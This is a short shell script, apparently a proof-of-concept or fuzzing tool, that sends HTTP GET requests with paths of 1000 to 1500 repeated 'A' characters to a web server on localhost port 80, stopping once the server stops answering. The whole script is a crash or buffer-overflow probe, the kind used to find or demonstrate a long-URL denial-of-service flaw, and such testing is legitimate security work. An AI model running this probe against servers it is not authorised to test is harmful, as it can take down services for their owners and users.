#! /bin/sh

# GET /['A' x 1011] HTTP/1.0

for j in `seq 1000 1500`;do
  BIGHUGE="GET /";
  for i in `seq 1 $j`;do
    BIGHUGE="${BIGHUGE}A";
  done
  BIGHUGE="${BIGHUGE} HTTP/1.0\r\n\r\n";
  echo "Testing length of $j...";
  /bin/echo -e -n ${BIGHUGE} | socket localhost 80 > /dev/null || exit 0
done
